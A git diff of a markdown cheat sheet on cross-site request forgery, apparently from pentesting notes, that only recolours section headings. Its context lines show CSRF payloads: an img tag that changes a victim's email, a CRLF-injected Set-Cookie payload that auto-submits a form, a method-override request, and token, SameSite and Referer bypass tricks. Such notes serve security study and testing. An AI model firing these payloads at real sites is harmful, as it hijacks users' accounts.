@@ -1,6 +1,6 @@
 # CSRF
 
-## <mark style="color:yellow;">**Exploit**</mark>
+## <mark style="color:purple;">**Exploit**</mark>
 
 **With POST**
 
@@ -23,7 +23,7 @@
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
 ```
 
-## <mark style="color:yellow;">Defences</mark>
+## <mark style="color:purple;">Defences</mark>
 
 <details>
 
@@ -70,7 +70,7 @@ Some applications make use of the HTTP Referer header to attempt to defend again
 
 </details>
 
-## <mark style="color:yellow;">CSRF tokens bypass</mark>
+## <mark style="color:purple;">CSRF tokens bypass</mark>
 
 * Switch from `POST` to the `GET` method
 * Remove the parameter containing the token
@@ -90,9 +90,9 @@ Some applications make use of the HTTP Referer header to attempt to defend again
     <img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
     ```
 
-## <mark style="color:yellow;">SameSite cookies bypass</mark>
+## <mark style="color:purple;">SameSite cookies bypass</mark>
 
-### <mark style="color:yellow;">Lax bypass</mark>
+### <mark style="color:purple;">Lax bypass</mark>
 
 * Using GET requests (bypass lax)
 
@@ -108,7 +108,7 @@ Some applications make use of the HTTP Referer header to attempt to defend again
     GET /my-account/change-email?email=a@a.com&_method=POST HTTP/1.1
     ```
 
-### <mark style="color:yellow;">Strict bypass</mark>
+### <mark style="color:purple;">Strict bypass</mark>
 
 Bypass via client-side redirect. Consider a page `https://vulnerable-website.com/post/confirm?postId=10` that load this script.
 
@@ -132,7 +132,7 @@ redirectOnConfirmation = () => {
 **Note**: this attack isn't possible with server-side redirects, as browsers recognize the cross-site request and apply cookie restrictions.
 {% endhint %}
 
-## <mark style="color:yellow;">Referer-based validation bypass</mark>
+## <mark style="color:purple;">Referer-based validation bypass</mark>
 
 * Some apps validate the Referer header if present, but skip if omitted
 
